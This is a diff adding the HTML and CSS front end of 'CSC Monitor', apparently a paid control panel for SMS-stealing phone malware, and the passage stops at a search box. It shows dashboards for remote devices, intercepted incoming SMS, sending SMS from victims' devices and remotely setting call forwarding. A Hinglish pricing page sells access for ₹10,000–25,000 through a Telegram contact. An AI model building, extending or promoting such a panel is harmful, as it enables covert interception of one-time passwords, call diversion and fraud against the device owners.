@@ -1,0 +1,3149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>CSC Monitor</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+:root{
+  --bg:#0d1117;
+  --surface:#161b22;
+  --surface2:#1c2333;
+  --surface3:#21262d;
+  --border:rgba(255,255,255,.08);
+  --border2:rgba(0,212,255,.2);
+  --cyan:#00d4ff;
+  --cyan-dim:#00a8cc;
+  --cyan-glow:rgba(0,212,255,.25);
+  --cyan-soft:rgba(0,212,255,.08);
+  --violet:#7c3aed;
+  --violet-soft:rgba(124,58,237,.12);
+  --green:#10b981;
+  --green-dim:#059669;
+  --green-glow:rgba(16,185,129,.3);
+  --green-soft:rgba(16,185,129,.1);
+  --white:#e6edf3;
+  --muted:#7d8590;
+  --red:#f85149;
+  --red-soft:rgba(248,81,73,.12);
+  --amber:#e3b341;
+  --text-bright:#ffffff;
+}
+body{font-family:'Inter','Segoe UI',Arial,sans-serif;background:var(--bg);color:var(--white);min-height:100vh;
+  overscroll-behavior-y:contain;-webkit-overflow-scrolling:touch;}
+html{overscroll-behavior-y:none;background:var(--bg);}
+
+/* ===== SETUP / PASSWORD SCREEN ===== */
+#setup-screen{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;
+  background:radial-gradient(ellipse at 20% 50%,rgba(124,58,237,.12) 0%,transparent 50%),radial-gradient(ellipse at 80% 20%,rgba(0,212,255,.08) 0%,transparent 50%),#0d1117;}
+.sc{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.1);border-radius:18px;
+  padding:28px 20px;width:100%;max-width:420px;
+  box-shadow:0 0 0 1px rgba(12,156,94,.1),0 20px 60px rgba(0,0,0,.4);}
+.logo{text-align:center;margin-bottom:20px;}
+.logo h1{font-size:21px;font-weight:800;color:var(--green);margin-top:6px;letter-spacing:.3px;}
+.logo p{font-size:11px;color:var(--muted);margin-top:3px;text-transform:uppercase;letter-spacing:1.2px;}
+.fg{margin-bottom:12px;}
+.fg label{display:block;font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:5px;}
+.fg input{width:100%;background:rgba(255,255,255,.05);border:1.5px solid rgba(255,255,255,.1);
+  border-radius:10px;padding:11px 13px;font-size:14px;outline:none;font-family:inherit;color:var(--white);}
+.fg input:focus{border-color:var(--green);box-shadow:0 0 0 3px rgba(12,156,94,.15);}
+.fg input::placeholder{color:var(--muted);}
+.pbtn{width:100%;background:var(--green);color:#ffffff;border:none;border-radius:10px;padding:14px;
+  font-size:15px;font-weight:800;cursor:pointer;margin-top:4px;font-family:inherit;letter-spacing:.3px;
+  box-shadow:0 4px 20px rgba(12,156,94,.4);}
+.pbtn:disabled{opacity:.4;cursor:not-allowed;box-shadow:none;}
+.errbox{background:var(--red-soft);border:1px solid rgba(248,113,113,.3);color:var(--red);
+  padding:10px 13px;border-radius:8px;font-size:13px;margin-top:10px;display:none;line-height:1.5;}
+
+/* ===== TOPBAR ===== */
+.topbar{background:rgba(13,17,23,.92);border-bottom:1px solid var(--border);padding:13px 15px;
+  display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:200;
+  backdrop-filter:blur(12px);}
+.tb-l{display:flex;align-items:center;gap:8px;color:var(--white);font-size:15px;font-weight:700;}
+.live-dot{width:8px;height:8px;border-radius:50%;background:var(--green);
+  box-shadow:0 0 8px var(--green-glow);animation:blink 2s infinite;}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:.3;}}
+.tb-r{display:flex;gap:7px;}
+.xbtn{background:rgba(255,255,255,.06);color:var(--white);border:1px solid var(--border);
+  border-radius:8px;padding:6px 12px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;}
+.xbtn:hover{background:rgba(255,255,255,.1);}
+
+/* ===== APP LAYOUT ===== */
+#app{display:none;flex-direction:column;min-height:100vh;}
+.search-wrap{background:rgba(13,17,23,.92);padding:9px 14px;border-bottom:1px solid var(--border);
+  position:sticky;top:55px;z-index:190;backdrop-filter:blur(12px);}
+.sw{position:relative;}
+.sw input{width:100%;background:var(--surface2);border:1.5px solid var(--border);
+  border-radius:10px;padding:9px 34px 9px 36px;font-size:14px;outline:none;
+  font-family:inherit;color:var(--white);}
+.sw input:focus{border-color:var(--green);}
+.sw input::placeholder{color:var(--muted);}
+.s-ic{position:absolute;left:11px;top:50%;transform:translateY(-50%);font-size:15px;color:var(--muted);}
+.s-cl{position:absolute;right:10px;top:50%;transform:translateY(-50%);
+  background:none;border:none;font-size:14px;color:var(--muted);cursor:pointer;display:none;}
+
+/* ===== STATS ===== */
+.stats-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:9px;padding:11px 14px 0;}
+.stat-box{background:var(--surface);border-radius:14px;padding:13px 8px;text-align:center;
+  border:1px solid var(--border);position:relative;overflow:hidden;}
+.stat-box::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(12,156,94,.06),transparent);border-radius:14px;}
+.stat-n{font-size:26px;font-weight:800;line-height:1;color:var(--text-bright);}
+.stat-l{font-size:10px;color:var(--muted);margin-top:3px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;}
+
+/* ===== BUTTONS ===== */
+.upd-btn{display:block;margin:10px 14px 0;width:calc(100% - 28px);background:var(--green);
+  color:#ffffff;border:none;border-radius:10px;padding:14px;font-size:14px;font-weight:800;
+  letter-spacing:.5px;cursor:pointer;font-family:inherit;box-shadow:0 4px 16px rgba(12,156,94,.3);}
+
+/* ===== TABS ===== */
+.dash-tabs{display:flex;background:rgba(13,17,23,.92);border-bottom:1px solid var(--border);
+  margin-top:10px;position:sticky;top:110px;z-index:180;backdrop-filter:blur(12px);}
+.dtab{flex:1;padding:11px 4px;border:none;background:none;font-size:12px;font-weight:700;
+  cursor:pointer;font-family:inherit;border-bottom:2px solid transparent;color:var(--muted);}
+.dtab.active{color:var(--green);border-bottom:2px solid var(--green);}
+
+/* ===== DEVICE CARDS ===== */
+.dev-list{padding:8px 14px 80px;}
+.dev-card{background:var(--surface);border-radius:14px;margin-bottom:10px;
+  border:1px solid var(--border);border-left:3px solid var(--border);
+  overflow:hidden;transition:transform .15s,border-left-color .3s;position:relative;}
+.dev-card.is-online{border-left-color:var(--green);}
+.dev-card:active{transform:scale(.98);}
+.dev-card.just-seen::before{content:'';position:absolute;inset:0;border-radius:14px;
+  background:linear-gradient(120deg,transparent,rgba(12,156,94,.18),transparent);
+  background-size:200% 100%;animation:scanline 1.1s ease-out;pointer-events:none;}
+@keyframes scanline{0%{background-position:200% 0;opacity:1;}100%{background-position:-50% 0;opacity:0;}}
+.dev-inner{display:flex;align-items:center;gap:11px;padding:13px 13px 11px;cursor:pointer;}
+.dev-num{font-size:13px;font-weight:700;color:var(--muted);min-width:28px;}
+.dev-img{font-size:34px;filter:saturate(.8) brightness(1.2);}
+.dev-info{flex:1;}
+.dev-name{font-size:14px;font-weight:700;color:#ffffff;}
+.dev-id{font-size:11px;color:#6b8f7a;margin-top:2px;}
+.dev-bat{font-size:11px;color:#6b8f7a;margin-top:2px;}
+.dev-status-row{display:flex;align-items:center;justify-content:space-between;
+  padding:7px 13px;border-top:1px solid var(--border);}
+.st-on{color:var(--green);font-size:12px;font-weight:700;}
+.st-off{color:var(--muted);font-size:12px;font-weight:700;}
+.del-dev-btn{background:var(--red-soft);border:1px solid rgba(248,113,113,.3);color:var(--red);
+  border-radius:8px;padding:4px 10px;font-size:11px;font-weight:700;cursor:pointer;font-family:inherit;}
+
+/* ===== ALL SMS ===== */
+.allsms-wrap{padding:8px 14px 80px;}
+.allsms-bar{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;}
+.allsms-info{font-size:12px;color:var(--muted);font-weight:600;}
+.allsms-rbtn{background:var(--green);color:#ffffff;border:none;border-radius:8px;
+  padding:6px 14px;font-size:12px;font-weight:800;cursor:pointer;font-family:inherit;}
+.asms-card{background:var(--surface);border-radius:12px;padding:12px 13px;
+  margin-bottom:9px;border:1px solid var(--border);cursor:pointer;}
+.asms-card.is-new{animation:slideIn .4s ease;border-color:var(--green);}
+@keyframes slideIn{from{transform:translateX(-10px);opacity:0;}to{transform:translateX(0);opacity:1;}}
+.new-badge{background:var(--green);color:#ffffff;font-size:10px;font-weight:800;
+  padding:1px 6px;border-radius:8px;margin-left:6px;}
+.asms-dev{font-size:11px;font-weight:700;color:var(--green);background:var(--green-soft);
+  display:inline-block;padding:2px 8px;border-radius:12px;margin-bottom:5px;}
+.asms-addr{font-size:13px;font-weight:600;color:var(--text-bright);margin:4px 0 3px;}
+.asms-body{font-size:13px;color:var(--white);line-height:1.5;word-break:break-word;}
+.asms-time{font-size:11px;color:var(--muted);text-align:right;margin-top:5px;}
+.asms-del{float:right;background:var(--red-soft);border:1px solid rgba(248,113,113,.3);
+  color:var(--red);border-radius:7px;padding:3px 8px;font-size:11px;font-weight:700;
+  cursor:pointer;font-family:inherit;margin-left:8px;}
+
+/* ===== DETAIL SCREEN ===== */
+#detail-screen{display:none;flex-direction:column;min-height:100vh;}
+.d-top{background:rgba(13,17,23,.92);border-bottom:1px solid var(--border);
+  padding:13px 14px;display:flex;align-items:center;gap:8px;
+  position:sticky;top:0;z-index:200;backdrop-filter:blur(12px);}
+.bbtn{background:rgba(255,255,255,.06);color:var(--white);border:1px solid var(--border);
+  border-radius:8px;padding:6px 12px;font-size:13px;cursor:pointer;font-family:inherit;}
+.d-title{color:var(--text-bright);font-size:14px;font-weight:700;flex:1;
+  overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.d-st{font-size:11px;font-weight:700;padding:2px 8px;border-radius:10px;white-space:nowrap;}
+.d-st-on{background:var(--green-soft);color:var(--green);}
+.d-st-off{background:rgba(107,143,122,.12);color:var(--muted);}
+.d-actions{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:12px 14px;}
+.act-btn{background:var(--surface2);color:var(--green);border:1px solid var(--border2);
+  border-radius:10px;padding:13px 8px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit;}
+.act-btn:active{background:var(--green-soft);}
+
+/* ===== DETAIL TABS ===== */
+.tabs{display:flex;border-bottom:1px solid var(--border);
+  background:rgba(13,17,23,.92);position:sticky;top:55px;z-index:100;backdrop-filter:blur(12px);}
+.tab-btn{flex:1;padding:11px;border:none;background:none;font-size:12px;font-weight:700;
+  cursor:pointer;font-family:inherit;color:var(--muted);}
+.tab-btn.active{color:var(--green);border-bottom:2px solid var(--green);}
+.panel{padding:0 14px 80px;}
+.panel.hide{display:none;}
+
+/* ===== SMS CARDS ===== */
+.sms-card{background:var(--surface);border-radius:12px;padding:13px;
+  margin-bottom:10px;border:1px solid var(--border);}
+.sms-card.just-arrived{animation:smsDropIn .5s ease;border-color:var(--green);
+  box-shadow:0 0 0 1px rgba(12,156,94,.2);}
+@keyframes smsDropIn{0%{transform:translateY(-14px) scale(.97);opacity:0;}
+  60%{transform:translateY(2px) scale(1.01);opacity:1;}100%{transform:translateY(0) scale(1);opacity:1;}}
+.new-sms-badge{display:inline-block;background:var(--green);color:#fff;font-size:10px;
+  font-weight:800;padding:2px 7px;border-radius:8px;margin-left:7px;letter-spacing:.3px;
+  animation:newBadgePulse 1.6s ease-in-out 2;vertical-align:middle;}
+@keyframes newBadgePulse{0%,100%{opacity:1;}50%{opacity:.55;}}
+.sms-addr{font-size:13px;font-weight:700;color:var(--green);margin-bottom:5px;}
+.sms-body{font-size:13px;color:var(--white);line-height:1.6;word-break:break-word;}
+.sms-time{font-size:11px;color:var(--muted);text-align:right;margin-top:6px;}
+
+/* ===== INFO / DATA CARDS ===== */
+.info-card{background:var(--surface);border-radius:12px;padding:13px 14px;
+  margin-bottom:10px;border:1px solid var(--border);}
+.info-label{font-size:11px;font-weight:700;color:var(--muted);
+  text-transform:uppercase;letter-spacing:.6px;margin-bottom:5px;}
+.info-val{font-size:14px;font-weight:600;color:var(--text-bright);word-break:break-all;}
+.debug-box{background:rgba(251,191,36,.08);border:1px solid rgba(251,191,36,.25);
+  border-radius:8px;padding:10px;margin-bottom:10px;font-size:11px;
+  color:var(--amber);word-break:break-all;}
+
+/* ===== SEARCH SCREEN ===== */
+#search-screen{display:none;flex-direction:column;min-height:100vh;}
+.sr-info{padding:8px 14px;font-size:13px;color:var(--muted);}
+.sr-list{padding:4px 14px 80px;}
+.src-card{background:var(--surface);border-radius:12px;padding:12px 13px;
+  margin-bottom:9px;border:1px solid var(--border);cursor:pointer;}
+.src-badge{background:var(--green-soft);color:var(--green);font-size:11px;font-weight:700;
+  padding:3px 10px;border-radius:18px;display:inline-block;margin-bottom:7px;}
+.hl{background:var(--green);color:#ffffff;border-radius:3px;padding:0 2px;}
+
+/* ===== DIALOGS ===== */
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:500;
+  display:none;align-items:flex-end;justify-content:center;}
+.dlg{background:var(--surface);border:1px solid var(--border);
+  border-radius:20px 20px 0 0;width:100%;max-width:460px;
+  max-height:90vh;overflow-y:auto;animation:up .2s ease;}
+@keyframes up{from{transform:translateY(60px);opacity:0;}to{transform:translateY(0);opacity:1;}}
+.dlg-hdr{padding:16px 18px;text-align:center;font-size:15px;font-weight:700;
+  color:#ffffff;background:linear-gradient(135deg,var(--cyan-dim),var(--violet));}
+.dlg-body{padding:16px 16px 28px;}
+.di{width:100%;background:var(--surface2);border:1.5px solid var(--border);
+  border-radius:10px;padding:11px 13px;font-size:14px;outline:none;
+  margin-bottom:11px;font-family:inherit;color:var(--white);}
+.di:focus{border-color:var(--green);}
+.di::placeholder{color:var(--muted);}
+.dbtn{width:100%;background:var(--green);color:#ffffff;border:none;border-radius:10px;
+  padding:13px;font-size:14px;font-weight:800;cursor:pointer;margin-bottom:9px;font-family:inherit;}
+.dbtn-row{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-bottom:9px;}
+.dbtn-h{background:var(--green);color:#ffffff;border:none;border-radius:10px;
+  padding:13px;font-size:13px;font-weight:800;cursor:pointer;font-family:inherit;}
+.dbtn-h.red{background:var(--red);color:#fff;}
+.dbtn-cancel{width:100%;background:var(--surface2);color:var(--muted);
+  border:1px solid var(--border);border-radius:10px;padding:12px;
+  font-size:14px;cursor:pointer;font-family:inherit;}
+.cf-res{background:var(--green-soft);border:1px solid var(--border2);color:var(--green);
+  padding:9px 12px;border-radius:8px;font-size:13px;margin-bottom:10px;display:none;text-align:center;}
+
+/* ===== SIM SELECTOR ===== */
+.sim-row{display:flex;align-items:center;gap:11px;background:var(--surface2);
+  border:1.5px solid var(--border);border-radius:10px;padding:11px 13px;
+  margin-bottom:9px;cursor:pointer;}
+.sim-row.sel{border-color:var(--green);background:var(--green-soft);}
+.sim-ic{font-size:20px;}
+.sim-inf{flex:1;}
+.sim-nm{font-size:14px;font-weight:600;color:var(--text-bright);}
+.sim-no{font-size:12px;color:var(--muted);margin-top:2px;}
+.sim-rb{width:18px;height:18px;border-radius:50%;border:2px solid var(--border);
+  flex-shrink:0;display:flex;align-items:center;justify-content:center;}
+.sim-rb.chk{border-color:var(--green);}
+.sim-rb.chk::after{content:'';width:9px;height:9px;border-radius:50%;background:linear-gradient(135deg,var(--cyan-dim),var(--violet));}
+
+/* ===== LOADING / EMPTY ===== */
+.loading{display:flex;align-items:center;justify-content:center;
+  padding:50px 14px;gap:12px;color:var(--muted);font-size:14px;}
+.spin{width:22px;height:22px;border:2.5px solid var(--border);
+  border-top-color:var(--cyan);border-radius:50%;animation:sp .8s linear infinite;}
+@keyframes sp{to{transform:rotate(360deg);}}
+.empty{text-align:center;padding:50px 14px;color:var(--muted);}
+.empty .ei{font-size:40px;margin-bottom:10px;opacity:.4;}
+.empty p{font-size:14px;line-height:1.6;}
+
+/* ===== TOAST ===== */
+#toast{position:fixed;bottom:22px;left:50%;transform:translateX(-50%);
+  background:var(--surface3);border:1px solid var(--border2);color:var(--text-bright);
+  padding:10px 22px;border-radius:22px;font-size:13px;z-index:9999;
+  opacity:0;pointer-events:none;transition:opacity .25s;white-space:nowrap;}
+
+/* ===== PROFILES ===== */
+.prof-list{margin-bottom:14px;}
+.prof-item{display:flex;align-items:center;gap:8px;background:var(--surface2);
+  border:1.5px solid var(--border);border-radius:50px;padding:6px 10px 6px 6px;
+  margin-bottom:6px;cursor:pointer;transition:all .2s;}
+.prof-item:active{opacity:.85;background:var(--green-soft);border-color:var(--border2);}
+.prof-num{width:28px;height:28px;border-radius:50%;background:var(--green);
+  color:#ffffff;font-size:12px;font-weight:800;display:flex;align-items:center;
+  justify-content:center;flex-shrink:0;}
+.prof-name{font-size:12px;font-weight:700;color:var(--text-bright);flex:1;
+  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.prof-url{display:none;}
+.prof-del{background:none;border:none;color:var(--muted);font-size:14px;
+  cursor:pointer;padding:0 2px;flex-shrink:0;}
+.prof-hdr{font-size:11px;font-weight:700;color:var(--muted);
+  text-transform:uppercase;letter-spacing:.8px;margin-bottom:8px;}
+</style>
+</head>
+<body>
+
+<style>
+/* ===== PLANS PAGE STYLES ===== */
+#plans-screen{display:none;min-height:100vh;background:radial-gradient(ellipse at 20% 50%,rgba(124,58,237,.12) 0%,transparent 50%),radial-gradient(ellipse at 80% 20%,rgba(0,212,255,.08) 0%,transparent 50%),#0d1117;color:#fff;padding:0 0 40px;}
+.plans-hero{text-align:center;padding:40px 20px 28px;}
+.plans-logo{font-size:48px;margin-bottom:12px;}
+.plans-title{font-size:28px;font-weight:900;letter-spacing:-.5px;color:#fff;margin-bottom:6px;}
+.plans-sub{font-size:14px;color:#6ee7b7;font-weight:500;}
+.plans-badge{display:inline-block;background:rgba(12,156,94,.2);border:1px solid rgba(12,156,94,.4);color:#6ee7b7;font-size:11px;font-weight:700;padding:4px 12px;border-radius:20px;margin-bottom:16px;letter-spacing:.5px;text-transform:uppercase;}
+/* Features */
+.features-section{padding:0 16px 28px;}
+.feat-title{font-size:12px;font-weight:700;color:#6ee7b7;text-transform:uppercase;letter-spacing:1px;margin-bottom:14px;text-align:center;}
+.feat-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+.feat-card{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.08);border-radius:14px;padding:14px 12px;text-align:center;}
+.feat-icon{font-size:24px;margin-bottom:6px;}
+.feat-name{font-size:12px;font-weight:700;color:#fff;margin-bottom:3px;}
+.feat-desc{font-size:11px;color:#94a3b8;line-height:1.4;}
+/* Plans */
+.plans-section{padding:0 16px 24px;}
+.plan-title{font-size:12px;font-weight:700;color:#6ee7b7;text-transform:uppercase;letter-spacing:1px;margin-bottom:14px;text-align:center;}
+.plan-card{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:18px;padding:20px 18px;margin-bottom:12px;position:relative;overflow:hidden;}
+.plan-card.popular{background:linear-gradient(135deg,rgba(12,156,94,.2),rgba(12,156,94,.08));border-color:rgba(12,156,94,.5);}
+.popular-tag{position:absolute;top:12px;right:12px;background:#0c9c5e;color:#fff;font-size:10px;font-weight:800;padding:3px 10px;border-radius:20px;letter-spacing:.5px;}
+.plan-name{font-size:13px;font-weight:700;color:#6ee7b7;margin-bottom:4px;text-transform:uppercase;letter-spacing:.5px;}
+.plan-price{font-size:32px;font-weight:900;color:#fff;line-height:1;}
+.plan-price span{font-size:14px;font-weight:500;color:#94a3b8;}
+.plan-period{font-size:12px;color:#94a3b8;margin-bottom:14px;margin-top:2px;}
+.plan-features{list-style:none;}
+.plan-features li{font-size:12px;color:#cbd5e1;padding:4px 0;display:flex;align-items:center;gap:7px;}
+.plan-features li::before{content:"✓";color:#0c9c5e;font-weight:900;flex-shrink:0;}
+/* CTA */
+.cta-section{padding:0 16px;}
+.tg-btn{width:100%;background:linear-gradient(135deg,#229ED9,#1a7db5);color:#fff;border:none;border-radius:14px;padding:16px;font-size:15px;font-weight:800;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:10px;box-shadow:0 8px 24px rgba(34,158,217,.3);}
+.tg-sub{font-size:12px;color:#64748b;text-align:center;line-height:1.5;}
+/* Divider */
+.divider{height:1px;background:rgba(255,255,255,.06);margin:24px 16px;}
+</style>
+
+<!-- ===== PLANS / LANDING SCREEN ===== -->
+<div id="plans-screen" style="display:none;">
+  <div class="plans-hero">
+    <div class="plans-logo">📡</div>
+    <div class="plans-badge">Professional Monitoring System</div>
+    <div class="plans-title">CSC Monitor</div>
+    <div class="plans-sub">Real-time device & SMS monitoring dashboard</div>
+  </div>
+
+  <!-- Features -->
+  <div class="features-section">
+    <div class="feat-title">✦ Kya milega aapko</div>
+    <div class="feat-grid">
+      <div class="feat-card">
+        <div class="feat-icon">📱</div>
+        <div class="feat-name">Live Device Tracking</div>
+        <div class="feat-desc">Har device ka real-time status, battery, online/offline</div>
+      </div>
+      <div class="feat-card">
+        <div class="feat-icon">💬</div>
+        <div class="feat-name">SMS Monitor</div>
+        <div class="feat-desc">Incoming SMS turant dikhe, search karo, copy karo</div>
+      </div>
+      <div class="feat-card">
+        <div class="feat-icon">📨</div>
+        <div class="feat-name">SMS Send</div>
+        <div class="feat-desc">Dashboard se seedha kisi bhi device pe SMS bhejo</div>
+      </div>
+      <div class="feat-card">
+        <div class="feat-icon">📞</div>
+        <div class="feat-name">Call Forwarding</div>
+        <div class="feat-desc">Device ka call forward remotely set/unset karo</div>
+      </div>
+      <div class="feat-card">
+        <div class="feat-icon">🔍</div>
+        <div class="feat-name">Smart Search</div>
+        <div class="feat-desc">Number, naam, SIM se instant SMS search</div>
+      </div>
+      <div class="feat-card">
+        <div class="feat-icon">⚡</div>
+        <div class="feat-name">Real-time Alerts</div>
+        <div class="feat-desc">Naya SMS aate hi animation ke saath notification</div>
+      </div>
+      <div class="feat-card">
+        <div class="feat-icon">🔗</div>
+        <div class="feat-name">Shareable Link</div>
+        <div class="feat-desc">Ek click mein secure link generate karo</div>
+      </div>
+      <div class="feat-card">
+        <div class="feat-icon">🛡️</div>
+        <div class="feat-name">Secure Access</div>
+        <div class="feat-desc">Password protected, sirf aap hi access kar sako</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- Plans -->
+  <div class="plans-section">
+    <div class="plan-title">✦ Plans &amp; Pricing</div>
+
+    <!-- Weekly -->
+    <div class="plan-card">
+      <div class="plan-name">⚡ Weekly</div>
+      <div class="plan-price">₹10,000<span>/week</span></div>
+      <div class="plan-period">7 din ka access</div>
+      <ul class="plan-features">
+        <li>Saare features included</li>
+        <li>Unlimited devices monitor</li>
+        <li>Real-time SMS tracking</li>
+        <li>SMS send & call forward</li>
+        <li>Telegram support</li>
+      </ul>
+    </div>
+
+    <!-- 15 Days - Popular -->
+    <div class="plan-card popular">
+      <div class="popular-tag">POPULAR</div>
+      <div class="plan-name">🔥 15 Days</div>
+      <div class="plan-price">₹15,000<span>/15 days</span></div>
+      <div class="plan-period">15 din ka access • Best value</div>
+      <ul class="plan-features">
+        <li>Saare features included</li>
+        <li>Unlimited devices monitor</li>
+        <li>Real-time SMS tracking</li>
+        <li>SMS send & call forward</li>
+        <li>Priority Telegram support</li>
+        <li>Payment history dashboard</li>
+      </ul>
+    </div>
+
+    <!-- Monthly -->
+    <div class="plan-card">
+      <div class="plan-name">💎 Monthly</div>
+      <div class="plan-price">₹25,000<span>/month</span></div>
+      <div class="plan-period">30 din ka access • Maximum savings</div>
+      <ul class="plan-features">
+        <li>Saare features included</li>
+        <li>Unlimited devices monitor</li>
+        <li>Real-time SMS tracking</li>
+        <li>SMS send & call forward</li>
+        <li>Priority Telegram support</li>
+        <li>Payment history dashboard</li>
+        <li>Custom link with password</li>
+        <li>Dedicated account manager</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- CTA -->
+  <div class="cta-section">
+    <button class="tg-btn" id="tg-contact-btn" onclick="openTelegram()">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.248l-1.97 9.289c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12L7.48 14.697l-2.95-.924c-.642-.204-.657-.642.136-.953l11.57-4.461c.537-.194 1.006.131.325.889z"/></svg>
+      Telegram pe Contact Karo
+    </button>
+    <div class="tg-sub">
+      Plan lene ke liye ya koi bhi sawaal ke liye<br/>
+      <strong style="color:#229ED9;" id="tg-id-display">@munnadhotarchor</strong> pe message karo
+    </div>
+  </div>
+</div>
+
+<!-- ===== INIT LOADER (shown during decryption) ===== -->
+<div id="init-loader" style="display:none;position:fixed;inset:0;z-index:9999;
+  background:#0a1810;align-items:center;justify-content:center;flex-direction:column;gap:14px;">
+  <div style="width:36px;height:36px;border:3px solid rgba(255,255,255,.1);
+    border-top-color:#0c9c5e;border-radius:50%;animation:sp .8s linear infinite;"></div>
+  <div style="color:#6b8f7a;font-size:13px;">Loading...</div>
+</div>
+
+<!-- ===== ACCESS DENIED SCREEN ===== -->
+<div id="denied-screen" style="display:none;position:fixed;inset:0;z-index:9999;
+  background:#0a1810;flex-direction:column;align-items:center;justify-content:center;padding:30px;text-align:center;">
+  <div style="font-size:56px;margin-bottom:16px;" id="denied-icon">🚫</div>
+  <div style="font-size:20px;font-weight:900;color:#fff;margin-bottom:8px;" id="denied-title">Access Denied</div>
+  <div style="font-size:14px;color:#94a3b8;line-height:1.7;margin-bottom:32px;max-width:280px;" id="denied-msg">
+    Aapka plan expire ho gaya hai.
+  </div>
+  <button onclick="openTelegram()"
+    style="background:linear-gradient(135deg,#229ED9,#1a7db5);color:#fff;border:none;
+    border-radius:14px;padding:15px 28px;font-size:15px;font-weight:800;cursor:pointer;
+    font-family:inherit;display:flex;align-items:center;gap:10px;margin:0 auto;">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.248l-1.97 9.289c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12L7.48 14.697l-2.95-.924c-.642-.204-.657-.642.136-.953l11.57-4.461c.537-.194 1.006.131.325.889z"/></svg>
+    Contact Admin
+  </button>
+  <div style="margin-top:10px;font-size:13px;color:#4b7a5e;" id="denied-tg-id">@munnadhotarchor</div>
+</div>
+
+<div id="setup-screen" style="display:none;min-height:100vh;align-items:center;justify-content:center;padding:20px;
+  background:radial-gradient(ellipse at 20% 50%,rgba(124,58,237,.12) 0%,transparent 50%),radial-gradient(ellipse at 80% 20%,rgba(0,212,255,.08) 0%,transparent 50%),#0d1117;">
+  <div class="sc">
+    <div class="logo">
+      <div style="font-size:50px">&#128225;</div>
+      <h1>CSC Monitor</h1>
+      <p>Firebase Realtime Database Dashboard</p>
+    </div>
+
+    <!-- Quick-connect: shown when URL has furl/key/node params embedded -->
+    <div id="qc-section" style="display:none;">
+      <div style="background:#f0fdf4;border:1.5px solid #bbf7d0;border-radius:12px;padding:12px 14px;margin-bottom:14px;font-size:13px;color:#166534;text-align:center;">
+        &#128279; Link se connect ho raha hai
+      </div>
+      <div class="fg"><label>Password</label>
+        <input id="qc-pass" type="password" placeholder="Admin password" autocomplete="off"
+          onkeydown="if(event.key==='Enter')doQuickConnect()"/>
+      </div>
+      <button class="pbtn" id="qc-btn" onclick="doQuickConnect()">&#9889; Connect</button>
+      <div class="errbox" id="qc-err"></div>
+    </div>
+
+    <!-- Full manual setup (hidden by default, only via showFullSetup()) -->
+    <div id="full-setup-section" style="display:none;">
+      <div id="prof-section" class="prof-list" style="display:none;">
+        <div class="prof-hdr">&#128190; Saved Profiles</div>
+        <div id="prof-list"></div>
+      </div>
+      <div class="fg"><label>Profile Name</label>
+        <input id="cfg-pname" placeholder="e.g. App 1, My Project" autocomplete="off"/></div>
+      <div class="fg"><label>Firebase Database URL</label>
+        <input id="cfg-url" placeholder="https://xxx-default-rtdb.firebaseio.com" autocomplete="off"/></div>
+      <div class="fg"><label>API Key</label>
+        <input id="cfg-key" type="password" placeholder="AIzaSy..."/></div>
+      <div class="fg"><label>Project ID</label>
+        <input id="cfg-pid" placeholder="your-project-id" autocomplete="off"/></div>
+      <div class="fg"><label>Main Node <span style="font-weight:400;text-transform:none;letter-spacing:0">(default: csc6)</span></label>
+        <input id="cfg-node" value="csc6"/></div>
+      <div style="display:grid;grid-template-columns:1fr auto;gap:8px;">
+        <button class="pbtn" id="setup-btn" onclick="doSetup()">Connect &amp; Open</button>
+        <button style="background:#eef3f0;color:#0c9c5e;border:1.5px solid #0a7d4a;border-radius:10px;padding:14px 12px;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit;white-space:nowrap;" onclick="saveProfile()">&#128190; Save</button>
+      </div>
+      <div class="errbox" id="setup-err"></div>
+    </div>
+  </div>
+</div>
+
+<div id="app">
+  <div class="topbar">
+    <div class="tb-l"><span class="live-dot"></span> CSC Monitor</div>
+    <div class="tb-r"><button class="xbtn" onclick="openLinkGen()" style="background:#0c9c5e;color:#fff;border-color:#0a7d4a;">&#128279; Link</button><button class="xbtn" onclick="doLogout()">Logout</button></div>
+  </div>
+  <div class="search-wrap">
+    <div class="sw">
+      <span class="s-ic">&#128269;</span>
+      <input id="gsearch" placeholder="Search SMS (online devices)..." onkeydown="if(event.key==='Enter')doSearch()"/>
